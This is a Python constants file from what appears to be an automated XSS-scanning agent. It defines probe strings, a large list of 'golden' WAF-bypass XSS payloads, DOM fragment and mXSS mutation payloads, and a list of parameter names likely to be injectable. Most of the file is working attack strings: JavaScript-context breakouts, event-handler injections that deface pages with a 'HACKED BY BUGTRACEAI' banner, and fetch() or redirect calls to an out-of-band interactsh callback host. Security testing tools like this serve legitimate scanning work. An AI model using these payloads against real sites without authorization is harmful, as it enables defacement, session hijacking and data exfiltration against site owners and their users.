"""
XSS Agent Constants

Payloads, probe strings, and configuration values for XSS detection.
Extracted from xss_agent.py for modularity.
"""

from typing import List

# =============================================================================
# PROBE STRINGS
# =============================================================================

# Multi-stage probe pattern: Tests for characters: " < > &
# Note: Single quote removed - it causes 500 errors on some servers
PROBE_STRING = "BT7331\"<>&"

# Alternative probe for servers that error on double quotes
PROBE_STRING_SAFE = "BT7331xss"

# OMNIPROBE: Reconnaissance payload for Phase 1
# Tests: quotes, backslash-quotes, HTML tags, backticks
# NO CSTI/SSTI templates - that's CSTIAgent's job
OMNIPROBE_PAYLOAD = "BT7331'\"<>`\\'\\\""

# =============================================================================
# GOLDEN PAYLOADS - Elite payloads that bypass many WAFs
# =============================================================================

GOLDEN_PAYLOADS: List[str] = [
    # ====== CRITICAL: BACKSLASH-QUOTE BREAKOUTS (ginandjuice.shop killer) ======
    # These MUST be in top positions. For JS contexts where server escapes \ to \\ but not quotes.
    # Input: \' → Server: \\' = escaped backslash + unescaped quote = BREAKOUT
    "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
    "\\';alert(document.domain)//",
    "\\\";var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
    "\\\";alert(document.domain)//",

    # ====== HIGH PRIORITY ELITE PAYLOADS (VISUAL + OOB) ======
    # THE OMNI-PROBE: XSS + CSTI + SSTI Polyglot
    "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",

    # Double Encoding with Visual Banner
    "%253Csvg%2520onload%253D%2522fetch%2528%2527https%253A%252F%252F{{interactsh_url}}%2527%2529%253Bvar%253Ddocument.createElement%2528%2527div%2527%2529%253Bb.id%253D%2527bt-pwn%2527%253Bb.style%253D%2527background%253Ared%253Bcolor%253Awhite%253Btext-align%253Acenter%253Bpadding%253A10px%253Bposition%253Afixed%253Btop%253A0%253Bleft%253A0%253Bwidth%253A100%2525%253Bz-index%253A9999%253Bfont-weight%253Abold%253B%2527%253Bb.innerText%253D%2527HACKED%2520BY%2520BUGTRACEAI%2527%253Bdocument.body.prepend%2528b%2529%253B%2522%253E",

    # THE LEVEL 9 KILLER: Double backslash + Visual Banner
    "\\\");fetch('https://{{interactsh_url}}');(function(){var b=document.createElement('div');b.id='bt-pwn';b.style='background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})();//",

    # Unicode breakout with Visual Banner
    "\\u0022);fetch('https://{{interactsh_url}}');var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",

    # Autofocus bypass with Visual Banner
    "\" autofocus focus=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b) x=\"",

    # Template literal with Visual Banner
    "\\`+fetch('https://{{interactsh_url}}')+(function(){var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})()+\\`",

    # ====== CLASSIC & VISUAL PAYLOADS ======
    "\\\";var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",
    "\"><img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>",
    "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>",
    "\"><svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>",
    "\"><svg/onload=document.body.appendChild(document.createElement('div')).id='bt-pwn'>",
    "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
    "\"><svg/onload=document.location='https://{{interactsh_url}}'>",
    "\"><iframe src=javascript:alert(document.domain)>",
    "';{const d=document.createElement('div');d.style='position:fixed;top:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-size:24px;font-weight:bold;';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)};//",
    "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//",
    "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",
    "<details open ontoggle=fetch('https://{{interactsh_url}}')>",
]

# =============================================================================
# FRAGMENT PAYLOADS - DOM XSS via location.hash → innerHTML
# =============================================================================

FRAGMENT_PAYLOADS: List[str] = [
    "<img src=x onerror=alert(document.domain)>",
    "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
    "<img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
    "<svg/onload=fetch('https://{{interactsh_url}}')>",
    "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
    "<iframe src=javascript:fetch('https://{{interactsh_url}}')>",
    "<details open ontoggle=fetch('https://{{interactsh_url}}')>",
    "<body onload=fetch('https://{{interactsh_url}}')>",
    "<marquee onstart=fetch('https://{{interactsh_url}}')>",
    # mXSS mutation payloads
    "<svg><style><img src=x onerror=alert(document.domain)>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
    "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
]

# =============================================================================
# CONFIGURATION CONSTANTS
# =============================================================================

MAX_BYPASS_ATTEMPTS = 6

# Visual marker for screenshot validation
VISUAL_MARKER = "HACKED BY BUGTRACEAI"
VISUAL_MARKER_ELEMENT_ID = "bt-pwn"

# Interactsh placeholder in payloads
INTERACTSH_PLACEHOLDER = "{{interactsh_url}}"

# =============================================================================
# HIGH PRIORITY PARAMETERS - Parameters likely to be XSS vectors
# =============================================================================

HIGH_PRIORITY_PARAMS: List[str] = [
    # Search/query parameters
    "q", "query", "search", "s", "keyword", "keywords", "term",
    # Redirect/callback parameters
    "url", "redirect", "redirect_url", "return", "return_url",
    "callback", "cb", "jsonp", "jsonpcallback", "call",
    # Content display parameters
    "name", "title", "message", "msg", "content", "text", "body",
    "comment", "description", "desc", "value", "val", "data",
    # HTML injection points
    "html", "template", "tpl", "page", "view", "action",
    # Error/debug parameters
    "error", "err", "debug", "info", "warning",
    # User input parameters
    "input", "field", "user", "username", "email",
]

# =============================================================================
# CONTEXT TYPES
# =============================================================================

CONTEXT_TYPES = [
    "html_text",
    "html_attribute",
    "html_attribute_unquoted",
    "script_block",
    "script_string_single",
    "script_string_double",
    "script_template_literal",
    "event_handler",
    "url_context",
    "style_context",
    "comment",
]

__all__ = [
    "PROBE_STRING",
    "PROBE_STRING_SAFE",
    "OMNIPROBE_PAYLOAD",
    "GOLDEN_PAYLOADS",
    "FRAGMENT_PAYLOADS",
    "MAX_BYPASS_ATTEMPTS",
    "VISUAL_MARKER",
    "VISUAL_MARKER_ELEMENT_ID",
    "INTERACTSH_PLACEHOLDER",
    "HIGH_PRIORITY_PARAMS",
    "CONTEXT_TYPES",
]
